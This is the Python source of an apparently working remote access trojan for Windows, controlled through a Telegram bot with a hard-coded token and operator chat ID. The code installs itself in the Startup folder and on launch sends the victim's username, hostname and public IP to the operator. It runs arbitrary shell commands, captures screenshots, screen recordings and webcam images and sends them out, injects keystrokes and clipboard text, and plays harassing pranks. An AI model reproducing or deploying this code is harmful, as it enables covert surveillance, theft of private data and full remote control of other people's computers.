import telebot
from threading import Thread
import time
import pyautogui
import os
import getpass
import cv2
import numpy as np
import keyboard
from ctypes  import *
import os
import psutil
import random
import subprocess
import ctypes
import requests
from io import BytesIO
from PIL import Image
import socket
import pyperclip
# from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
screen_wide = windll.user32.GetSystemMetrics(0)
screen_height = windll.user32.GetSystemMetrics(1)

API_TOKEN = '6843835341:AAGttUrGXwA3xXqfNiRu-Ok-nPzZNu1B4ZY'

USER_NAME = getpass.getuser()

USEr_id = 6456704138
DHDHa_id = -55

bot = telebot.TeleBot(API_TOKEN,skip_pending = True)

global scr_pause
scr_pause = 0

time.sleep(45)
file_path = os.path.dirname(os.path.realpath(__file__))
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
       
       bat_file.write(r'start "" %s' % file_path+r"\2Larisa01.pyw"+'\n exit')


global screen_recording 
global sreen_recordinc_cycle_
global screen_recording_set_time 
global screen_recording_star_time 

screen_recording = False
sreen_recordinc_cycle_ = False
screen_recording_set_time = 1
screen_recording_star_time = 0

def video_record():
      global screen_recording 
      global sreen_recordinc_cycle_
      global screen_recording_set_time 
      global screen_recording_star_time 
      global screen_recording
      
      # img = pyautogui.screenshot()
      screen_size = (screen_wide,screen_height)
      fourcc = cv2.VideoWriter.fourcc(*'DIVX')
      output = r'C:\Users\Public\Downloads\video.avi'
      FPS = 1.5
      out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
      while True:
            out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))

            while screen_recording:
                  img = pyautogui.screenshot()
                  frame = np.array(img)
                  frame = cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
                  out.write(frame)
                  #StopIteration(0.5)
                  # cv2.imshow('frame',frame)
                  k = cv2.waitKey(1)
                  if time.time()-screen_recording_star_time>=int(screen_recording_set_time):
                        file = open(output,'rb')
                        bot.send_video(USEr_id,file)
                        print(sreen_recordinc_cycle_)
                        if int(sreen_recordinc_cycle_) == 1:
                              screen_recording_star_time = time.time()
                              out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
                              
                        else:
                              screen_recording = False
                              out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
            # os.remove(output)
                  
def scd():
      screenshot = pyautogui.screenshot()
      screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
      screenshot.save(screenshot_path)
      photo1= open(screenshot_path,"rb")
      bot.send_document(USEr_id,photo1)
      time.sleep(0.1)
      photo1.close()
      os.remove(screenshot_path)

th2 = Thread(target = video_record)
th2.start()
def scr(delay):
        global scr_pause
        if delay!='':
              scr_pause = delay
        elif delay == '':
              scr_pause = 0      
        screenshot = pyautogui.screenshot()
        screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
        screenshot.save(screenshot_path)
        photo1= open(screenshot_path,"rb")
        bot.send_photo(USEr_id,photo1)
        photo1.close()
        os.remove(screenshot_path)

def camera():
    cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
    retval, image = cap.read()
    image_bytes = cv2.imencode('.jpg', image)[1].tobytes() 
    cap.release()
    bot.send_photo(chat_id=USEr_id, photo=image_bytes )


def th1():
    global scr_pause
    while(True):
            def WRITE_TEXT(arg):
                   keyboard.write(arg)
            # keyboard = telebot.types.ReplyKeyboardMarkup(True)

            if int(scr_pause) != 0:
                  time.sleep(int(scr_pause))
                  scr(scr_pause)


th = Thread(target = th1)
th.start()


def WRITE_TEXT(arg):
      keyboard.write(arg)

def ALT_TAB_FILE():
     file_patch = r'C:\Users\Public\Videos'
     with open(file_patch + '\\' + "4diAtSVHM-xASJi.pyw", "w+") as mousse:
       
# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
       prog = f"""
import random
import keyboard
import time
keyboard.press_and_release('alt + tab')

"""
       mousse.write(prog)
       mousse.close()
       os.system(f"python {file_patch}\\4diAtSVHM-xASJi.pyw")



def DIMA():
     file_patch = r'C:\Users\Public\Videos'
     with open(file_patch + '\\' + "4diAtSLHM-xASJi.pyw", "w+") as mousse:
       

       prog = f"""
import cv2
import urllib
import numpy as np
import requests
import urllib.request
     
from PIL import Image
from io import BytesIO
from urllib.request import urlopen
import random
import time

url = "https://i.pinimg.com/736x/9a/b5/71/9ab5718105552adf92e5a6bf1ab1684f.jpg"
resp = urlopen(url)
image = np.asarray(bytearray(resp.read()), dtype="uint8")
image = cv2.imdecode(image,3)

cv2.imshow('lalala', image)
i = 0 
def open(hh):
     cv2.imshow("WHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT????????", hh)

while True:
     i+=1
     print(i)
     if i%20 == 0:
          cv2.destroyAllWindows() 
          open(image)
     name = str(random.randint(1000000,919912929912))
     cv2.imshow(name, image)
     for _ in range(15000):
          image[random.randint(0,600),random.randint(0,600)] = random.randint(0,255)
     image = cv2.flip(image, int(random.randint(-1,2)))
     k = cv2.waitKey(1)
     if i == 50:
          exit()

"""
       mousse.write(prog)
       mousse.close()
       os.system(f"python {file_patch}\\4diAtSLHM-xASJi.pyw")


@bot.message_handler(commands=['start'])
def start_message(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    
# #     keyboard.row('scr', 'scd','rec115','alb',"cmdtaskkill /f /im explorer.exe",r"cmdstart explorer.exe","mclr10","cam",'cmdshutdown -l',"wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631","wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")

#     bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)


    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=5)  # Указываем row_width=2 для двух кнопок в каждом ряду
    button1 = telebot.types.KeyboardButton("scr")
    button2 = telebot.types.KeyboardButton("scd")
    button3 = telebot.types.KeyboardButton("rec115")
    button4 = telebot.types.KeyboardButton("alb")
    button5 = telebot.types.KeyboardButton("cmdtaskkill /f /im explorer.exe")
    button6 = telebot.types.KeyboardButton("cmdstart explorer.exe")
    button7 = telebot.types.KeyboardButton("mclr10")
    button8 = telebot.types.KeyboardButton("cam")
    button9 = telebot.types.KeyboardButton("cmdshutdown -l")
    button10 = telebot.types.KeyboardButton("wlphttps://cdn.cloudflare.steamstatic.com/steam/apps/1206700/header.jpg?t=1603251631")
    button11 = telebot.types.KeyboardButton("wlphttps://i.ytimg.com/vi/zcNfZWySsMI/maxresdefault.jpg")
    button12 = telebot.types.KeyboardButton("cmdmsg %username% 'Приветик) Ты долбаеб)'")
    button13 = telebot.types.KeyboardButton("dim")

    # Добавляем кнопки в ряды
    keyboard.add(button1, button2,button3)
#     keyboard.add(button3)
    keyboard.add(button4, button5, button6)
    keyboard.add(button5, button6, button7,button13)
    keyboard.add(button8, button9, button10,button11,button12)

    bot.send_message(USEr_id, 'Keyboard Update', reply_markup=keyboard)

def sound():
     pass
      # sessions = AudioUtilities.GetAllSessions()
      # volume = session._ctl.QueryInterface(ISimpleAudioVolume)
      # volume.SetMasterVolume(0.6, None)

def CLIPBOARD(arg): #
    pyperclip.copy(arg)
    

def CMD(arg): 
    command = arg
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True, encoding='cp1251')
        if result.stdout != '':
            output_msg = ("результат операции:")
            output_msg = output_msg+ str(result.stdout)
        else:
            output_msg = ("Ошибка")
    except Exception as e:
        output_msg = (f"Произошла ошибка: {e}")
    bot.send_message(USEr_id,str(output_msg))  


def WALLPAPER(arg): #
    image_url = arg
    get_url = requests.get(image_url)
    image = Image.open(BytesIO(get_url.content))
    image_path = r'C:\Users\Public\Downloads\screenshot10100.png'
    image.save(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
    image.close()
    os.remove(image_path)


def MOUSE_CLICK_FILE(arg):
     file_patch = r'C:\Users\Public\Videos'
     with open(file_patch + '\\' + "3diAtSVHM-xASJi.pyw", "w+") as mousse:
       
# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
       prog = f"""
import random
import pyautogui
import time
arg = "{arg}"
button = arg[:1]
count = int(arg[1:])+1
if button == 'r' or button =="R":
      
      while int(count):
       count -= 1
       pyautogui.rightClick()
       time.sleep(0.1)
elif button =="l" or button =="L":
      
      while int(count):
            count -= 1
            pyautogui.leftClick()
            time.sleep(0.1)
count = 0      

"""
       mousse.write(prog)
       mousse.close()
       os.system(f"python {file_patch}\\3diAtSVHM-xASJi.pyw")



def MOUSE_SHAKE_FILE(arg):
     file_patch = r'C:\Users\Public\Videos'
     with open(file_patch + '\\' + "3diAtSVHM-xASCi.pyw", "w+") as mousse:
       
# 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
       prog = f"""
import random
import pyautogui
arg = "{arg}"
arg = arg.split(' ')
shake_intensity = int(arg[0])
shake_duration = int(arg[1])
for _ in range(int(shake_duration / 0.01)):
      x = random.randint(-shake_intensity,shake_intensity)
      y = random.randint(-shake_intensity,shake_intensity)
      pyautogui.move(x,y)
      pyautogui.moveTo(x,y)
shake_duration = 0

"""
       mousse.write(prog)
       mousse.close()
       os.system(f"python {file_patch}\\3diAtSVHM-xASCi.pyw")
     


liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh","cam","vlm",'hel','dim']

@bot.message_handler()
def receiving_mesage(message):

    global sreen_recordinc_cycle_
    global screen_recording_set_time 
    global screen_recording_star_time 
    global screen_recording
      # img = pyautogui.screen

    # print(message.chat.id)
    if (message.chat.id == USEr_id or message.chat.id == DHDHa_id) and message.text[:3] in liscommand:
       command = message.text[:3]
       print(command)
       arg = message.text[3:]
       if command == 'scr':
             scr(arg)
       elif command == 'rec':
              screen_recording = not(screen_recording)
              sreen_recordinc_cycle_ =  arg[:1]
              screen_recording_set_time = arg[1:]
              screen_recording_star_time = time.time()
              print("rec")
       elif command == 'scd':
        scd()

       elif command == 'alb':
        ALT_TAB_FILE()
        
       elif command == 'cmd':
            CMD(arg)
       elif command == 'wlp': 
            WALLPAPER(arg)
       elif command == "wrt":
            WRITE_TEXT(arg)     
       elif command == "clp":
            CLIPBOARD(arg)   
       elif command == "mlc":
            MOUSE_CLICK_FILE(arg)
       elif command == "msh":
            MOUSE_SHAKE_FILE(arg)
       elif command =="cam":
            camera()     
       elif command =="vlm":
            sound()
       elif command == 'hel':
            outr = ''
            for _ in liscommand:
                 outr += _
                 outr += " "
            bot.send_message(USEr_id,outr)
       elif command =="dim":
            DIMA()

       else:
            print(command+arg) 

       bot.send_message(USEr_id,
f"""получена команда: {command}
аргумент: {arg}""")     
    else:
          bot.send_message(message.chat.id,"who are you?")
          

strokahello =f"""
Бот запущен у пользователя: {USER_NAME}
Разрешение экрана: {screen_height}*{screen_wide}
{socket.getfqdn()}
ip: {requests.get('https://ip.beget.ru/').text}
  """
bot.send_message(USEr_id,strokahello)

bot.infinity_polling()

